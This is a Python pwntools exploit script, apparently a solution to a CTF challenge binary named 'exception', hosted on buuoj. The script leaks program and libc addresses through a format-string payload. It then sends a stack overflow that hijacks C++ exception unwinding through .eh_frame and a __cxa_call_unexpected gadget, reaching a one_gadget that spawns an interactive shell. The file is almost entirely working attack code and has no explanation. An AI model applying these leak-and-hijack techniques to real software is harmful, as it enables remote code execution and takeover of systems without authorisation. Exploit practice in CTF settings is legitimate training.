# -*- coding: UTF-8 -*-

from pwn import *
from ctypes import *
#context.terminal = ['tmux', 'splitw', '-h']
#context(os='linux', arch='amd64')

#libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
banary = "./exception"
elf = ELF(banary)
ip = 'xxxx'
port = 9999

local = 0
if(local==1):
	p = process(banary)
else:
	p = remote('node5.buuoj.cn',28298)
	
context.log_level = "debug"

def debug():
	gdb.attach(p)
	pause()
	
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
ru = lambda text : p.recvuntil(text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\x1b[01;38;5;214m %s --> 0x%x \033[0m' % (s, eval(s)))
pi = lambda : p.interactive()
#------------------------ fmt ----------------------------
#debug()

#%12$p -- main_arena

payload = "%9$p-%12$p"
sa("name\n", payload)

p.recvuntil('0x')
csu_init = int(p.recv(12), 16)  #__libc_csu_init)
lg('csu_init')

p.recvuntil('0x')
main_arena = int(p.recv(12), 16)
lg('main_arena')


elf_base = csu_init - 0x1480
libc_base = main_arena-0x1ECB80
libstdcpp_base = libc_base + 0x20D000


lg("elf_base")
lg("libc_base")
lg("libstdcpp_base")


#------------------------ chop ----------------------------
libc = ELF('/pwn/libc.so.6')

p.recvuntil("stack\n")
stack = int(p.recv(14), 16)
lg('stack')


eh_frame = elf_base + 0x14e4 #.eh_frame : rsp+8

golden_gadget = libstdcpp_base + 0xaa060 #_cxa_call_unexpected try{ + 1
lg('golden_gadget')


#crash1
elf_21F4 = elf_base + 0x21F4
lg("elf_21F4")


one_gadget = libc_base+0xe3b04

'''
payload =  b'x'*0x58
payload += p64(0xff)          #crash2 movzx edx, byte ptr [r13]
payload += p64(one_gadget)         #ROP   
payload += p64(elf_21F4)      #r13  crash1 0x14	
payload += b'g'*0x8           #rbp
payload += p64(eh_frame+1)  #ret
payload += p64(golden_gadget+1) 
'''
payload = b'x'*0x40
payload += b'a'*0x8
payload += b'b'*0x8
payload += b'c'*0x8
payload += p64(0xff)         
payload += p64(one_gadget)            
payload += p64(elf_21F4)       			
payload += b'g'*0x8         #rbp
payload += p64(eh_frame+1)  #ret
payload += p64(golden_gadget+1) 


s(payload)

    
pi()
